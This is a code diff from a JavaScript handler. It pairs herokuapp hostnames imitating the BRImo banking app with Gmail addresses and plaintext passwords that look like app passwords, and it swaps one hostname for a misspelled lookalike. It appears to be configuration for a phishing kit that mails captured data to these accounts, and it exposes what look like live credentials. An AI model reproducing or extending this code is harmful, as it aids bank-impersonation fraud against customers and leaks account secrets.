@@ -17,7 +17,7 @@ export default function handler(req, res) {
         email = 'impianbarub@gmail.com';
         pass = 'rofndibfsscucshv';
 
-    } else if (url == 'bi-fas-app-brimo.herokuapp.com'){
+    } else if (url == 'bif-as-app-brmo.herokuapp.com'){
         email = 'rumahbarubaru443@gmail.com';
         pass = 'lssxwneekjuwlvgt';
 
